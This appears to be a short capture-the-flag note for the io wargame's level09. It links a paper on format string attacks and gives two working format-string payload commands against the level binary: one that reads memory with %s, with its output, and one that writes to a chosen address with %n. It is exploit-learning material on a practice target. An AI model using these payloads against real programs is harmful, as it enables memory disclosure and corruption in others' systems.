good paper: https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf

To read arbitrary memory (say from the environment variable area):
```
level9@io:/tmp/maxblevelztesting9$ /levels/level09 $(python -c "print '\xa0\xfe\xff\xbfAAA1_%08x.%08x.%08x.%s'")
����AAA1_bffffe20.000003ff.00000000._PATH=/usr/local/radare/lib/level9@io:/tmp/maxblevelztesting9$
```

To write arbitrarily to memory
```
level9@io:/tmp/maxblevelztesting9$ /levels/level09 $(python -c "print '\xa0\xfe\xff\xbfAAA1_%08x.%08x.%08x.%n'")
```
will write the integer `24` to 0xbffffea0 (where `24` is the number of bytes written by printf)
